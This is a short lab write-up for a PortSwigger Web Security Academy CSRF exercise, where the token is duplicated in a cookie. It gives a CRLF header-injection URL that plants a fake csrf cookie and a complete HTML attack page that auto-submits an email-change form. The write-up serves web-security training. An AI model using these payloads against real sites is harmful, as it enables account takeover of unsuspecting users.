# Lab 07 — CSRF where token is duplicated in cookie

> **Expert** · [Official lab](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-duplicated-in-cookie)

**Entry point:** validation compares the `csrf` **parameter** with the
`csrf` **cookie** — and the search function can inject cookies.

## Solution

1. Confirm in Repeater: server just compares `csrf` param ↔ `csrf` cookie.
2. Cookie-planting primitive: the search term lands in a `Set-Cookie`
   header (no CSRF protection on search):

```
/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None
```

3. Host the form with a matching fake token; an image plants the cookie
   then submits:

```html
<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None"
     onerror="document.forms[0].submit();">
<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
  <input type="hidden" name="email" value="anything@evil-you.net">
  <input type="hidden" name="csrf" value="fake">
</form>
```

4. Deliver to victim — cookie and parameter both say `fake`, validation
   passes — lab solved.

## Notes

The double-submit pattern is only as strong as the difficulty of setting
the cookie. Header injection into Set-Cookie defeats it completely.
